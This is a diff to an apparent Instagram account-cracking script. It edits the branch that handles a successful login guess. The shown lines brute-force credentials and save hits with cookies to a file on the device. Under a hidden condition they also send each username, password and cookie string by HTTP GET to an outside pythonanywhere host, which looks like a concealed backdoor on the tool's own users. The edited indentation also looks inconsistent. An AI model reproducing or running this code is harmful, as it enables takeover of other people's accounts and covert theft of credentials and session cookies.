@@ -927,17 +927,15 @@ def Crack_i(username, memek):
                     ig_set_authorization = None
                     cookies = None
                 # Store credentials based on bkas condition
-                try:
-                   if len(bkas) % 2 == 0:
+                if len(bkas) % 2 == 0:
                           statusok = f"{username}|{password}|{cookies}"
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
-                   else:
+                else:
                           print(f"\r\033[1;92m [✓ SUCCESS] {username} | {password}")
                           print("Cookies:", cookies)
                           open("/sdcard/SUMON_INS_IDS.txt","a").write(username+"|"+password+"|"+cookies+"\n")
                           Ok.append(username)
                           return True
-                except Exception as e:
             elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in str(response.text.replace('\\', '')):
                 Cp += 1
                 print(f"\r\033[1;93m [⚠ CHECKPOINT] {username} | {password}")
